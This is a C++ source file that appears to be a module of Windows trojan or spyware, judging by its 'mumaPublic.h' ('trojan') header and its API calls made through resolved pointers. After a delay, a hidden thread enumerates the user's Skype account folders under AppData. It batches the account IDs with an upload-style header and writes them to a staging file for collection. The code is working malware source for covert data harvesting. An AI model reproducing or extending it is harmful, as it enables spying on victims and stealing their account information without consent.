// getAppID.cpp: implementation of the getAppID class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "getAppID.h"
#include "WinApi.h"
#include "mumaPublic.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

AppIDWrite::AppIDWrite()
{
	SendCount = 0;
	offset    = 1024;
	SendBuf   = new char[APPIDLEN*MAXCOUNT+1024];	
}

AppIDWrite::~AppIDWrite()
{
	if (SendBuf != NULL)
	{
		delete []SendBuf;
		SendBuf = NULL;
	}
}

BOOL AppIDWrite::WriteBuf(const char * Buf, DWORD Buflen, BOOL bFinish)
{
	if(SendCount>0)
	{
		SendCount++;
	
		memcpy(SendBuf+offset, Buf, Buflen);
		offset += Buflen;
	}
	
	//	OutputDebugString("WriteBuf");
	
	if (SendCount >= MAXCOUNT || (bFinish && offset>1024))
	{
		offset += sprintf(SendBuf+offset,"%d",SendCount);

		char tmpbuf[1024];
		// 生成描述信息
		SYSTEMTIME nowtime;
		PGetLocalTime(&nowtime);
		
		char hardstrfilename[MAX_PATH];
		char hardstrfilea[MAX_PATH];
		char FixDir[10];
		strcpy(FixDir, GetTmpPrevFix(FIX_SYSTEMINFO));
		CreateFileName(FixDir, hardstrfilename, hardstrfilea);		// 得到目标文件名
		int len = sprintf(tmpbuf, "time: %04d%02d%02d%02d%02d%02d\r\nackfile: %s\r\ncontent-length: %d\r\ncontent-type: appid_v1\r\n\r\n",
			nowtime.wYear, nowtime.wMonth, nowtime.wDay,
			nowtime.wHour, nowtime.wMinute, nowtime.wSecond, hardstrfilea, offset-1024);
		
		int datalen = offset-1024 + len;
		memcpy(SendBuf+1024-len, tmpbuf, len);
		
		char *pBuffer = new char[datalen+10];
		memset(pBuffer, 0, datalen+10);
		memcpy(pBuffer, SendBuf+1024-len, datalen);
		
		myWriteFile(pBuffer, datalen, hardstrfilename, hardstrfilea);
		
		delete []pBuffer;
		memset(SendBuf, 0, APPIDLEN*SendCount+1024);
		SendCount = 0;
		offset = 1024;
		
		Sleep(2000);
	}
	
	return TRUE;
}

BOOL AppIDWrite::WriteOneData(const char *szAppID, const char *szType)
{
	char buf[APPIDLEN];
	DWORD buflen;
	
	buflen = 0;
	memset(buf, 0, APPIDLEN);
	buflen = sprintf(buf, "%d\t%s\t%s\n", SendCount, szAppID, szType);
	
	WriteBuf(buf, buflen);
	
	return TRUE;
}

BOOL AppIDWrite::WriteEnd()
{
	WriteBuf("", 0, TRUE);
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////


AppIDFun::AppIDFun()
{	
}

AppIDFun::~AppIDFun()
{
}

BOOL AppIDFun::Init()
{
	//数据路径
	GetAppDataPath(AppDataPath);
	GetLocalAppDataPath(LocalAppDataPath);
	
	return TRUE;
}

BOOL AppIDFun::Deal()
{
	Init();
	DealSkype();
	WriteEnd();
	
	return TRUE;
}

BOOL AppIDFun::DealSkype()
{
	CHAR SearchPath[MAX_PATH], SkypeDir[MAX_PATH];
	sprintf(SkypeDir, "%s\\Skype", AppDataPath);
	strcpy(SearchPath, SkypeDir);
	strcat(SearchPath, "\\*.*");
	HANDLE hfindfile;
	WIN32_FIND_DATAA finddata;
	hfindfile = PFindFirstFileA(SearchPath, &finddata);
	if (hfindfile != INVALID_HANDLE_VALUE)
	{
		do{
			if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if(finddata.cFileName[0] == '.')
					continue;
				
				CHAR SkypeMsg[MAX_PATH];
				sprintf(SkypeMsg, "%s\\%s\\main.db", SkypeDir, finddata.cFileName);

				if(_access(SkypeMsg, 0) == 0)
				{
					WriteOneData(finddata.cFileName, "skype");
				}
				
			}
		}while(PFindNextFileA(hfindfile, &finddata));
		
		PFindClose(hfindfile);
	}

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////

DWORD WINAPI ThreadGetAppID(LPVOID lp)
{
	Sleep(5000);
	
	AppIDFun appid;
	appid.Deal();
	
	return 0;
}

DWORD ThreadGetAppIDStart(char * pPara)
{
	DWORD dwID;
	
	HANDLE hthread=CreateThread(
		NULL,
		NULL, 
		ThreadGetAppID, 
		NULL,
		NULL, 
		&dwID);
	if (hthread != NULL)
	{
		CloseHandle(hthread);
	}
	
	return 0;
}

